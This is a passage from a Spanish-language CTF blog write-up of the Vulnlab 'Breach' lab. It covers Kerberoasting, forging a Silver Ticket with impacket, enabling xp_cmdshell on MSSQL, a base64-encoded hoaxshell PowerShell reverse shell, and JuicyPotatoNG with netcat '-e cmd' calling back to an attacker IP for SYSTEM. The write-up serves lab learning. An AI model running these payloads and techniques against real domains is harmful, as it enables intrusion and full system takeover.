+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt hash2
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
+No password hashes left to crack <span class="o">(</span>see FAQ<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="silver-ticket">Silver Ticket</h2>
+
+<ul>
+  <li>
+    <p>Bueno, ahora lo que podemos hacer es un <strong>Silver Ticket</strong> para suplantar al usuario <strong>administrator</strong> . Lo primero que necesitamos es el SID (Security Identifier) del dominio. Es un identificador único que se asigna a cada dominio de Active Directory en un entorno de Windows. Es un valor alfanumérico que se utiliza para identificar de manera única el dominio en toda la infraestructura de Active Directory. <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket</a>.</p>
+  </li>
+  <li>
+    <p>También puedes guardar el <strong>hash</strong> directamente de esta forma:</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs <span class="nt">-request</span> <span class="nt">-dc-ip</span> breach.vl breach.vl/Julia.Wong:Computer1 <span class="nt">-save</span> <span class="nt">-outputfile</span> kerboras.txt
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation
+<span class="nt">--------------------------------</span>  <span class="nt">---------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
+MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2024-03-10 13:07:33.948684
+</code></pre></div></div>
+
+<ul>
+  <li>Mediante <code class="language-plaintext highlighter-rouge">getPac</code> obtenemos el <strong>sid</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getPac <span class="nt">-targetUser</span> administrator breach.vl/julia.wong:<span class="k">*********</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+KERB_VALIDATION_INFO
+LogonTime:
+    dwLowDateTime:                   2560514102
+    dwHighDateTime:                  30942228
+LogoffTime:
+    dwLowDateTime:                   4294967295
+    dwHighDateTime:                  2147483647
+KickOffTime:
+    dwLowDateTime:                   4294967295
+    dwHighDateTime:                  2147483647
+PasswordLastSet:
+    dwLowDateTime:                   1978590349
+    dwHighDateTime:                  30942177
+PasswordCanChange:
+    dwLowDateTime:                   2690163853
+    dwHighDateTime:                  30942378
+PasswordMustChange:
+    dwLowDateTime:                   1799906445
+    dwHighDateTime:                  30950626
+EffectiveName:                   <span class="s1">'Administrator'</span>
+FullName:                        <span class="s1">''</span>
+LogonScript:                     <span class="s1">''</span>
+ProfilePath:                     <span class="s1">''</span>
+HomeDirectory:                   <span class="s1">''</span>
+HomeDirectoryDrive:              <span class="s1">''</span>
+LogonCount:                      45
+BadPasswordCount:                5
+UserId:                          500
+PrimaryGroupId:                  513
+GroupCount:                      5
+GroupIds:
+    <span class="o">[</span>
+
+        RelativeId:                      520
+        Attributes:                      7 ,
+
+        RelativeId:                      512
+        Attributes:                      7 ,
+
+        RelativeId:                      513
+        Attributes:                      7 ,
+
+        RelativeId:                      518
+        Attributes:                      7 ,
+
+        RelativeId:                      519
+        Attributes:                      7 ,
+    <span class="o">]</span>
+UserFlags:                       544
+UserSessionKey:
+    Data:                            b<span class="s1">'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span>
+LogonServer:                     <span class="s1">'BREACHDC'</span>
+LogonDomainName:                 <span class="s1">'BREACH'</span>
+LogonDomainId:
+    Revision:                        1
+    SubAuthorityCount:               4
+    IdentifierAuthority:             b<span class="s1">'\x00\x00\x00\x00\x00\x05'</span>
+    SubAuthority:
+        <span class="o">[</span>
+             21,
+             2330692793,
+             3312915120,
+             706255856,
+        <span class="o">]</span>
+LMKey:                           b<span class="s1">'\x00\x00\x00\x00\x00\x00\x00\x00'</span>
+UserAccountControl:              131088
+SubAuthStatus:                   0
+LastSuccessfulILogon:
+    dwLowDateTime:                   0
+    dwHighDateTime:                  0
+LastFailedILogon:
+    dwLowDateTime:                   0
+    dwHighDateTime:                  0
+FailedILogonCount:               0
+Reserved3:                       0
+SidCount:                        1
+ExtraSids:
+    <span class="o">[</span>
+
+        Sid:
+            Revision:                        1
+            SubAuthorityCount:               1
+            IdentifierAuthority:             b<span class="s1">'\x00\x00\x00\x00\x00\x12'</span>
+            SubAuthority:
+                <span class="o">[</span>
+                     2,
+                <span class="o">]</span>
+        Attributes:                      7 ,
+    <span class="o">]</span>
+ResourceGroupDomainSid:
+    Revision:                        1
+    SubAuthorityCount:               4
+    IdentifierAuthority:             b<span class="s1">'\x00\x00\x00\x00\x00\x05'</span>
+    SubAuthority:
+        <span class="o">[</span>
+             21,
+             2330692793,
+             3312915120,
+             706255856,
+        <span class="o">]</span>
+ResourceGroupCount:              1
+ResourceGroupIds:
+    <span class="o">[</span>
+
+        RelativeId:                      572
+        Attributes:                      536870919 ,
+    <span class="o">]</span>
+Domain SID: S-1-5-21-2330692793-3312915120-706255856
+
+ 0000   10 00 00 00 2E A4 16 0B  BD EE B3 4C B6 CF 09 CC   ...........L....
+</code></pre></div></div>
+
+<ul>
+  <li>Una vez hecho esto, necesitamos crear un hash ntlmv2 para el servicio mssql en este caso que corresponde a la contraseña del usuario <strong>svc_msqql</strong> <a href="https://codebeautify.org/ntlm-hash-generator">https://codebeautify.org/ntlm-hash-generator</a>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/vulnlab/img/machines/breach/1.png" />
+</p>
+
+<ul>
+  <li>Ahora con <strong>ticketer</strong> vamos a generar un <strong>ticket</strong> como <strong>administrator</strong> con toda la información que tenemos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-ticketer <span class="nt">-nthash</span> 69596c7aa1e8daee17f8e78870e25a5c <span class="nt">-domain-sid</span> S-1-5-21-2330692793-3312915120-706255856 <span class="nt">-domain</span> breach.vl <span class="nt">-dc-ip</span> breachdc <span class="nt">-spn</span> MSSQLSvc/breachdc.breach.vl:1433 Administrator
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating basic skeleton ticket and PAC Infos
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Customizing ticket <span class="k">for </span>breach.vl/Administrator
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_LOGON_INFO
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_CLIENT_INFO_TYPE
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTicketPart
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTGSRepPart
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Signing/Encrypting final ticket
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_SERVER_CHECKSUM
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_PRIVSVR_CHECKSUM
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTicketPart
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTGSRepPart
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator.ccache
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a establecer <code class="language-plaintext highlighter-rouge">KRB5CCNAME</code> en el valor <code class="language-plaintext highlighter-rouge">Administrator.ccache</code>, se indica al sistema que utilice este archivo específico como el archivo de caché de credenciales de Kerberos para las operaciones de autenticación en curso.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos podemos conectar.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient <span class="nt">-k</span> breachdc.breach.vl
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>BREACHDC<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>BREACHDC<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>150 7208<span class="o">)</span>
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+SQL <span class="o">(</span>BREACH<span class="se">\A</span>dministrator  dbo@master<span class="o">)&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Algo que podemos hacer como <strong>Administrator</strong> es habilitar el módulo <strong>xp_cmdshell</strong> para ejecutar comandos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>BREACH<span class="se">\A</span>dministrator  dbo@master<span class="o">)&gt;</span> enable_xp_cmdshell
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>BREACHDC<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 185: Configuration option <span class="s1">'show advanced options'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>BREACHDC<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 185: Configuration option <span class="s1">'xp_cmdshell'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL <span class="o">(</span>BREACH<span class="se">\A</span>dministrator  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="nb">whoami
+</span>output
+<span class="nt">----------------</span>
+breach<span class="se">\s</span>vc_mssql
+
+NULL
+
+SQL <span class="o">(</span>BREACH<span class="se">\A</span>dministrator  dbo@master<span class="o">)&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Para obtener una reverse shell para ejecutar un payload en PowerShell para eso puedes usar el siguiente recurso: <a href="https://github.com/t3l3machus/hoaxshell">https://github.com/t3l3machus/hoaxshell</a>.</p>
+  </li>
+  <li>
+    <p>Ahora, para obtener una reverse Shell vamos a ejecutarlo.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>BREACH<span class="se">\A</span>dministrator  dbo@master<span class="o">)&gt;</span> xp_cmdshell powershell <span class="nt">-e</span> JABzAD0AJwAxADAALgA4AC4AMQAuADEAMgA3ADoAOAAwADgAMAAnADsAJABpAD0AJwBmADYAYQBkADEANwA0ADQALQA3ADUAOQA5ADIAZAA5ADQALQA4ADQAYQBhAGQAYgA5AGQAJwA7ACQAcAA9ACcAaAB0AHQAcAA6AC8ALwAnADsAJAB2AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AZgA2AGEAZAAxADcANAA0ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGQAYwBlADUALQA4ADcAYwAyACIAPQAkAGkAfQA7AHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAewAkAGMAPQAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADcANQA5ADkAMgBkADkANAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQBkAGMAZQA1AC0AOAA3AGMAMgAiAD0AJABpAH0AKQAuAEMAbwBuAHQAZQBuAHQAOwBpAGYAIAAoACQAYwAgAC0AbgBlACAAJwBOAG8AbgBlACcAKQAgAHsAJAByAD0AaQBlAHgAIAAkAGMAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAIAAtAEUAcgByAG8AcgBWAGEAcgBpAGEAYgBsAGUAIABlADsAJAByAD0ATwB1AHQALQBTAHQAcgBpAG4AZwAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJAByADsAJAB0AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAcAAkAHMALwA4ADQAYQBhAGQAYgA5AGQAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQBkAGMAZQA1AC0AOAA3AGMAMgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A
+</code></pre></div></div>
+
+<ul>
+  <li>Nos llega la Shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  hoaxshell git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 hoaxshell.py <span class="nt">-s</span> 10.8.1.127
+
+    ┬ ┬ ┌─┐ ┌─┐ ─┐ ┬ ┌─┐ ┬ ┬ ┌─┐ ┬   ┬
+    ├─┤ │ │ ├─┤ ┌┴┬┘ └─┐ ├─┤ ├┤  │   │
+    ┴ ┴ └─┘ ┴ ┴ ┴ └─ └─┘ ┴ ┴ └─┘ ┴─┘ ┴─┘
+                           by t3l3machus
+
+<span class="o">[</span>Info] Generating reverse shell payload...
+powershell <span class="nt">-e</span> JABzAD0AJwAxADAALgA4AC4AMQAuADEAMgA3ADoAOAAwADgAMAAnADsAJABpAD0AJwBmADYAYQBkADEANwA0ADQALQA3ADUAOQA5ADIAZAA5ADQALQA4ADQAYQBhAGQAYgA5AGQAJwA7ACQAcAA9ACcAaAB0AHQAcAA6AC8ALwAnADsAJAB2AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AZgA2AGEAZAAxADcANAA0ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGQAYwBlADUALQA4ADcAYwAyACIAPQAkAGkAfQA7AHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAewAkAGMAPQAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADcANQA5ADkAMgBkADkANAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQBkAGMAZQA1AC0AOAA3AGMAMgAiAD0AJABpAH0AKQAuAEMAbwBuAHQAZQBuAHQAOwBpAGYAIAAoACQAYwAgAC0AbgBlACAAJwBOAG8AbgBlACcAKQAgAHsAJAByAD0AaQBlAHgAIAAkAGMAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAIAAtAEUAcgByAG8AcgBWAGEAcgBpAGEAYgBsAGUAIABlADsAJAByAD0ATwB1AHQALQBTAHQAcgBpAG4AZwAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJAByADsAJAB0AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAcAAkAHMALwA4ADQAYQBhAGQAYgA5AGQAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQBkAGMAZQA1AC0AOAA3AGMAMgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A
+Copied to clipboard!
+<span class="o">[</span>Info] Type <span class="s2">"help"</span> to get a list of the available prompt commands.
+<span class="o">[</span>Info] Http Server started on port 8080.
+<span class="o">[</span>Important] Awaiting payload execution to initiate shell session...
+<span class="o">[</span>Shell] Payload execution verified!
+<span class="o">[</span>Shell] Stabilizing <span class="nb">command </span>prompt...
+
+PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32 <span class="o">&gt;</span> <span class="nb">whoami
+</span>breach<span class="se">\s</span>vc_mssql
+
+PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32 <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<ul>
+  <li>Bueno, encontramos el <strong>SeImpersonatePrivilege</strong> que podemos explotar fácilmente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32 <span class="o">&gt;</span> <span class="nb">whoami</span> /all
+USER INFORMATION
+<span class="nt">----------------</span>
+
+User Name        SID
+<span class="o">================</span> <span class="o">=============================================</span>
+breach<span class="se">\s</span>vc_mssql S-1-5-21-2330692793-3312915120-706255856-1115
+
+
+GROUP INFORMATION
+<span class="nt">-----------------</span>
+
+Group Name                                 Type             SID                                                             Attributes                            
+<span class="o">==========================================</span> <span class="o">================</span> <span class="o">===============================================================</span> <span class="o">==================================================</span>
+Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\U</span>sers                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\P</span>re-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\S</span>ERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\A</span>uthenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\T</span>his Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
+NT SERVICE<span class="se">\M</span>SSQL<span class="nv">$SQLEXPRESS</span>                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner
+LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\N</span>TLM Authentication           Well-known group S-1-5-64-10                                                     Mandatory group, Enabled by default, Enabled group
+Mandatory Label<span class="se">\H</span>igh Mandatory Level       Label            S-1-16-12288                                                                                          
+
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                               State
+<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
+
+
+USER CLAIMS INFORMATION
+<span class="nt">-----------------------</span>
+
+User claims unknown.
+
+Kerberos support <span class="k">for </span>Dynamic Access Control on this device has been disabled.
+
+PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32 <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Pues bueno, para esto, como ya sabemos, podemos usar el siguiente recurso: <a href="https://github.com/antonioCoco/JuicyPotatoNG/releases">https://github.com/antonioCoco/JuicyPotatoNG/releases</a>.</p>
+  </li>
+  <li>
+    <p>Simplemente, nos descargamos eso y también enviamos el netcat a la máquina víctima descargándolo con curl.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData <span class="o">&gt;</span> <span class="nb">dir
+</span>Directory: C:<span class="se">\P</span>rogramData
+
+
+Mode                 LastWriteTime         Length Name                           
+<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                           
+d-----         2/10/2022  12:59 AM                Amazon                         
+d-----         3/10/2024   6:09 PM                docker                         
+d---s-         2/17/2022  10:26 AM                Microsoft                      
+d-----         2/17/2022  10:27 AM                Package Cache                  
+d-----         3/10/2024   6:32 PM                regid.1991-06.com.microsoft    
+d-----          5/8/2021   8:20 AM                SoftwareDistribution           
+d-----          5/8/2021   9:36 AM                ssh                            
+d-----         9/15/2021   3:11 AM                USOPrivate                     
+d-----          5/8/2021   8:20 AM                USOShared                      
+<span class="nt">-a----</span>         3/10/2024  10:13 PM         153600 JuicyPotato.exe                
+<span class="nt">-a----</span>         3/10/2024  10:15 PM          28160 nc.exe
+
+PS C:<span class="se">\P</span>rogramData <span class="o">&gt;</span> .<span class="se">\J</span>uicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\n</span><span class="s2">c.exe"</span> <span class="nt">-a</span> <span class="s1">'10.8.1.127 443 -e cmd'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Recibimos la Shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ <span class="nb">sudo </span>rlwrap nc <span class="nt">-nlvp</span> 443
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.8.1.127] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.90.80] 59266
+Microsoft Windows <span class="o">[</span>Version 10.0.20348.558]
+<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\&gt;</span><span class="nb">whoami
+whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\&gt;</span><span class="nb">cd </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+<span class="nb">cd </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;dir
+<span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is B465-02B6
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+
+02/17/2022  10:51 AM    &lt;DIR&gt;          <span class="nb">.</span>
+02/17/2022  09:35 AM    &lt;DIR&gt;          ..
+02/17/2022  10:52 AM                36 root.txt
+               1 File<span class="o">(</span>s<span class="o">)</span>             36 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>  11,751,800,832 bytes free
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/vulnlab/machines/2024/03/28/breach.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
